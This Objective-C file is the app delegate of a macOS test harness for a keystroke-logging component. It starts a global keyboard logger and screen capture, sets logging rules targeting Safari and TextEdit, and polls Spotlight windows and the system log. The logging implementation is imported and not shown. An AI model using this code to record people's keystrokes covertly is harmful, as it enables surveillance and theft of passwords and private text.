//
//  TestKeyLogCaptureManagerAppDelegate.m
//  TestKeyLogCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "TestKeyLogCaptureManagerAppDelegate.h"
#import "KeyboardLoggerManager.h"
#import "KeyboardCaptureManager.h"
#import "KeyboardEventHandler.h"
#import "KeyLogRule.h"
#import "ac.h"

@interface TestKeyLogCaptureManagerAppDelegate (private)
- (void) spotlightWindowDict;
- (void) darwinNotificationCenterTest;
@end

@implementation TestKeyLogCaptureManagerAppDelegate

@synthesize window;
@synthesize LogMessage;
@synthesize LogScroll;

static void fileSystemCallback(ConstFSEventStreamRef aStreamRef, void* aSelf, size_t aNumEvents, void* aEventPaths, 
                               const FSEventStreamEventFlags aEventFlags[], const FSEventStreamEventId aEventIds[]);
- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    // Insert code here to initialize your application

    keyHandler = [[KeyboardEventHandler alloc]init];
    [keyHandler registerToGlobalEventHandler];
    
    keyLogger = [[KeyboardLoggerManager alloc] initWithKeyboardEventHandler:keyHandler];
    [keyLogger startKeyboardLogger];
    
    //[NSThread detachNewThreadSelector:@selector(spotlightWindowDict) toTarget:self withObject:nil];
    
    key = [[KeyboardCaptureManager alloc]initWithScreenshotPath:@"" withKeyboardLoggerManager:keyLogger];
    
    [self darwinNotificationCenterTest];
}
-(void)KeepUpdate{
    NSFileManager * file = [NSFileManager defaultManager];
    NSError *err;
    if ([file fileExistsAtPath:@"/var/log/system.log"]) {
        NSAutoreleasePool * pool = [[NSAutoreleasePool alloc]init];
        NSString * read = [NSString stringWithContentsOfFile:@"/var/log/system.log" encoding:NSUTF8StringEncoding error:&err];
        [LogMessage setString:read];
        [pool release];
    }
}
- (IBAction)StopKeyLog:(id)sender {
    [keyLogger stopKeyboardLogger];
    [key stopCapture];
}

- (IBAction)StartKeyLog:(id)sender {
    [keyLogger startKeyboardLogger];
    [key startCapture];
}

- (IBAction)KeyRuleTest:(id)sender {
    NSLog(@"Add Rule");
    
    KeyLogRule * rule1 = [[KeyLogRule alloc]init];
    NSString * appBun1 = @"com.apple.Safari";
    [rule1 setMApplicationID:appBun1];
    [rule1 setMTextLessThan:5];
    
    KeyLogRule * rule2 = [[KeyLogRule alloc]init];
    NSString * appBun2 = @"com.apple.TextEdit";
    [rule2 setMApplicationID:appBun2];
    [rule2 setMTextLessThan:4];
    
    
    NSMutableArray * arrayofRule = [[NSMutableArray alloc]initWithObjects:rule1,rule2, nil];
    
    [key setMKeyLogRules:arrayofRule];
    
    [rule1 release];
    [rule2 release];
}

- (IBAction)Update:(id)sender {
    [NSThread detachNewThreadSelector:@selector(KeepUpdate) toTarget:self withObject:nil];
}

- (void) spotlightWindowDict {
    while (1) {
        pid_t pid = 0;
        NSArray *runningApps = [NSRunningApplication runningApplicationsWithBundleIdentifier:@"com.apple.Spotlight"];
        NSRunningApplication *spotlightApp = [runningApps firstObject];
        pid = [spotlightApp processIdentifier];
        NSLog(@"PID of Spotlight = %d", pid);
        
        CGWindowListOption listOptions = kCGWindowListOptionOnScreenOnly | kCGWindowListExcludeDesktopElements;
        CFArrayRef windowList = CGWindowListCopyWindowInfo(listOptions, kCGNullWindowID);
        for (int i = (int)[(NSArray *)windowList count] - 1; i >= 0; i--) {
            NSDictionary * windowDict  = [(NSArray *)windowList objectAtIndex:i];
            NSNumber *windowPID = [windowDict objectForKey:(NSString *)kCGWindowOwnerPID];
            if (pid == [windowPID intValue]) {
                NSLog(@"windowDict = %@", windowDict);
            }
        }
        
        [NSThread sleepForTimeInterval:2.0];
        CFBridgingRelease(windowList);
    }
}

/* This function is called when a notification is received. */

void MyNotificationCenterCallBack(CFNotificationCenterRef center,
                                  
                                  void *observer,
                                  
                                  CFStringRef name,
                                  
                                  const void *object,
                                  
                                  CFDictionaryRef userInfo)

{
    
    printf("Notification center handler called\n");
    NSLog(@"Notification center handler called\n");
}

- (void) darwinNotificationCenterTest {
    /* Create a notification center */

    CFNotificationCenterRef center = CFNotificationCenterGetDarwinNotifyCenter();



    /* Tell notifyd to alert us when this notification
     
     is received. */

    if (center) {
        
        NSLog(@"Darwin notification center");
        
        CFNotificationCenterAddObserver(center,
                                        
                                        NULL,
                                        
                                        MyNotificationCenterCallBack,
                                        
                                        NULL,//CFSTR("org.apache.httpd.configFileChanged"),
                                        
                                        NULL,
                                        
                                        CFNotificationSuspensionBehaviorDeliverImmediately);
    
    }
}

- (void)dealloc {
    [key release];
    [keyLogger release];
    [keyHandler release];
    [super dealloc];
}
@end
